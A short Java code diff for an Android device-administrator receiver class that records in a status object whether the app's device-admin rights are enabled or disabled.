@@ -1,5 +1,6 @@
 package com.android.networking.listener;
 
+import com.android.networking.Status;
 import com.android.networking.auto.Cfg;
 import com.android.networking.util.Check;
 
@@ -20,6 +21,8 @@ public class AR extends android.app.admin.DeviceAdminReceiver {
 		if (Cfg.DEBUG) {
 			Check.log(TAG + " (onEnabled) ");
 		}
+		
+		Status.self().setDeviceAdmin(true);
 	}
 
 	/** Called when this application is no longer the device administrator. */
@@ -29,6 +32,7 @@ public class AR extends android.app.admin.DeviceAdminReceiver {
 		if (Cfg.DEBUG) {
 			Check.log(TAG + " (onDisabled) ");
 		}
+		Status.self().setDeviceAdmin(false);
 	}
 
 	@Override
